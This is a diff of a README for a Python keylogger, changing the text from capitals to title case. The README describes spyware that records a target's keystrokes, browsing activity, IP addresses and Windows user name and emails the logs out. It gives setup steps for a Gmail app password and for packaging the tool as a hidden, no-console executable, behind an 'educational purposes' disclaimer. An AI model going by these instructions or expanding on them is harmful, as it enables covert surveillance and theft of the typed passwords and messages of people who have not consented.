@@ -1,17 +1,14 @@
-DISCLAIMER! : THIS IS FOR EDUCATIONAL PURPOSES ONLY DON'T USE THIS PROGRAM TO STEAL INFORMATION AND SPY TO ANYONE THAT YOU NOT HAVE A PERMISSION. AGAIN! I'AM NOT RESPONSIBLE FOR THE RISK AND POSSIBLE BAD HAPPENS WITH THE HELP OF THIS PROGRAM. DON'T USE FOR MALICIOUS PURPOSES DON'T GO TO JAIL!, DON'T VIOLATE THE LAW! USE IT FOR AWARENESS TO YOUR LOVE ONES AND FRIENDS OR THE OTHER NEAR YOU ALSO SERVES AS A WARNING TO WHAT WILL HAPPEN IF THEY DOWNLOAD SOFTWARE DIRECTLY TO THE INTERNET WITHOUT CHECKING AND JUST RUN IT TO THE COMPUTER!.
+Disclaimer! : This is for Educational Purposes Only Don't Use This Program to Steal Information and Spy to Anyone That You Not Have a Permission. Again! I'am Not Responsible for the Risk and Possible Bad Happens With the Help of This Program. Don't Use for Malicious Purposes Don't Go to Jail!, Don't Violate the Law! Use It for Awareness to Your Love Ones and Friends or the Other Near You Also Serves as a Warning to What Will Happen if They Download Software Directly to the Internet Without Checking and Just Run It to the Computer!.
 
-First we need to install in the terminal type pip install pynput.
+First We Need to Install in the Terminal Type Pip Install Pynput.
 
-THIS IS THE ADVANCE KEYLOGGER WRITTEN IN PYTHON IMPROVED VERSION UNLIKE LAST TIME THIS IS HAS MORE FUNCTIONALITY THAN THAT YOU CAN CHECK IT ALSO HERE https://github.com/dtsiken/Simple-Keylogger. IN ADDITION TO MY PREVIOUS THAT I CREATED IT CONTAINS PUBLIC AND PRIVATE IP ADDRESS ALSO DATE AND TIME STAMP IS MAINTAINED AND THE USER PROFILE NAME OF THE WINDOWS TARGET COMPUTER IS BEEN ADDED ALSO. IT CREATES A TEXT FILE AND AFTER A COUPLE OF TIME YOU CAN ADJUST THE DELAY IN THE LINE 88 AND LINE 134 IT WILL DELETE AND SENDS IT TO EMAIL AS A ATTACHMENT IN THIS METHOD I USER RANDOM TO CREATE A RANDOM NAME IN A NUMBER FOR TO THE TEXT FILE.
+This is the Advance Keylogger Written in Python Improved Version Unlike Last Time This is Has More Functionality Than That You Can Check It Also Here Https://github.com/dtsiken/simple-keylogger. In Addition to My Previous That I Created It Contains Public and Private Ip Address Also Date and Time Stamp is Maintained and the User Profile Name of the Windows Target Computer is Been Added Also. It Creates a Text File and After a Couple of Time You Can Adjust the Delay in the Line 88 and Line 134 It Will Delete and Sends It to Email as a Attachment in This Method I User Random to Create a Random Name in a Number for to the Text File.
 
-SPECIAL FEATURE:
-THIS IS NOT ALSO LOGS KEYSTROKES AND SEND TO THE EMAIL BUT ALSO INSIDE THE TEXT FILE ATTACHED CONTAINS A LOGS OF WHAT THE TARGET BROWSING OR USING AMAZING RIGHT!?.
+Special Feature: This is Not Also Logs Keystrokes and Send to the Email but Also Inside the Text File Attached Contains a Logs of What the Target Browsing or Using Amazing Right!?.
 
-If you want to make it executable just install pyinstaller or nuitka to make it onefile and noconsole and independent to python and all libraries.
+If You Want to Make It Executable Just Install Pyinstaller or Nuitka to Make It Onefile and Noconsole and Independent to Python and All Libraries.
 
-TUTORIAL:
-CLONE THIS REPOSITORY OR DOWNLOAD THIS REPOSITORY AS ZIP AND SAVE IT TO YOUR DRIVE AFTER BEING EXTRACTED PUT YOUR EMAIL AND PASSWORD TO THE config.py AND SAVE IT BECAUSE THE GMAIL REMOVES ALLOW LESS SECURE ACCESS THIS IS THE ALTERNATIVE TO THAT GO TO YOUR GMAIL PROFILE AND GO TO MANAGE YOUR ACCOUNT GO TO THE SECURITY SECTION AND AND CLICK THE APP PASSWORD TAB. FOR THE FIRST TIME THAT HAS NOT ACTIVATED THE 2 FACTOR AUTHENTICATION ACTIVATE IT FIRST AND IT WILL SHOW. AFTER CLICKING APP PASSWORD IT WILL PROMPT FOR YOUR PASSWORD TO VERIFY THAT ITS YOU
-WHEN YOU PUTTED IN YOUR PASSWORD SCROLL DOWN A LITTLE BIT UNTIL YOU FIND THE SELECT APP IN THIS SECTION YOU CAN USE MAIL OR OTHER IF YOU CHOOSE MAIL SELECT A DEVICE DEPENDS ON YOUR PREFERENCE CLICK GENERATE TO PROCEED IT WILL SHOW THE GENERATED APP PASSWORD THAT YOU CREATED COPY THAT AND PASTE IT TO THE config.py AS A PASSWORD THATS IT!.
+Tutorial: Clone This Repository or Download This Repository as Zip and Save It to Your Drive After Being Extracted Put Your Email and Password to the Config.py and Save It Because the Gmail Removes Allow Less Secure Access This is the Alternative to That Go to Your Gmail Profile and Go to Manage Your Account Go to the Security Section and and Click the App Password Tab. For the First Time That Has Not Activated the 2 Factor Authentication Activate It First and It Will Show. After Clicking App Password It Will Prompt for Your Password to Verify That Its You When You Putted in Your Password Scroll Down a Little Bit Until You Find the Select App in This Section You Can Use Mail or Other if You Choose Mail Select a Device Depends on Your Preference Click Generate to Proceed It Will Show the Generated App Password That You Created Copy That and Paste It to the Config.py as a Password Thats It!.
 
 ![image](https://user-images.githubusercontent.com/101923825/192100076-968eab79-b8f4-4eb6-b9d0-c90feca1b599.png)
 
@@ -31,5 +28,4 @@ WHEN YOU PUTTED IN YOUR PASSWORD SCROLL DOWN A LITTLE BIT UNTIL YOU FIND THE SEL
 
 ![Screenshot 2022-09-24 213201](https://user-images.githubusercontent.com/101923825/192100802-ecd2fec3-9f55-4195-bda9-ac93b191d81f.png)
 
-I HAVE TO ERASE OUT THE IP ADDRESS FOR PRIVACY PURPOSES BUT THE PROGRAM WORKS FINE DONT MIND THE IMAGE IF SOME OF THE LOGS ARE BLANK IT IS FOR THE SAFETY MEASURES THAT I MADE BEFORE PUBLISHING.
-
+I Have to Erase Out the Ip Address for Privacy Purposes but the Program Works Fine Dont Mind the Image if Some of the Logs Are Blank It is for the Safety Measures That I Made Before Publishing.
